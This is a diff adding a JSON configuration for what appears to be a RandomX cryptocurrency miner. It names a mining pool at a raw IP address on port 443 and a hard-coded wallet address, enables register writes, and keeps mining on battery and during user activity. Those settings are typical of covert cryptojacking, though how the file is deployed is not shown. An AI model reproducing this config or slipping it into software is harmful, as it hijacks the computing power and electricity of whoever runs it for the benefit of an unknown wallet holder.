@@ -1,0 +1,39 @@
+{
+    "pool": {
+        "url": "47.236.39.4:443",
+        "username": "89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ",
+        "password": "Z",
+        "keepalive": true,
+        "retry_pause": 5
+    },
+    "cpu": {
+        "enabled": true,
+        "threads": 4,
+        "priority": 2,
+        "affinity": null
+    },
+    "randomx": {
+        "init": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false
+    },
+    "log": {
+        "level": "info",
+        "file": "pentolan.log",
+        "print_time": true,
+        "verbose": false
+    },
+    "api": {
+        "enabled": false,
+        "port": 8000,
+        "access-token": null,
+        "worker-id": null,
+        "reuse-timeout": 0
+    },
+    "donate-level": 1,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
